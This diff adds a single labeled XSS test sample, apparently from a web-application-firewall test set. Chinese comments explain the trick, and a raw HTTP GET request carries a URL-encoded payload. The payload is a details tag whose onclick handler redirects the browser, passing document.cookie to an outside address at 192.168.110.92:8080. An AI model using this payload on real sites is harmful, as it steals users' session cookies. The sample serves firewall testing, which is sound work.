@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_details标签_onclick事件-06506615
+# 攻击载荷利用了HTML中的details标签和onclick属性，触发location.href向恶意地址发送cookie信息。需要单机元素后触发，未使用单引号和双引号绕过测试，读取coolkie
+GET /?id=%3Cdetails%20onclick=%28location.href=%22http:%2F%2F192.168.110.92:8080%2Findex.jsp%3Fid=%22+document.cookie%29%3Etest%3C%2Fdetails%3E&bid=hd_tag_m8mv25ug HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25ug
+RM-PRO-Token: c942a1404ce1aac43545cf2c3db4afb7
+RM-PRO-Time: 1742808507635
+User-Agent: curl/7.83.1
+
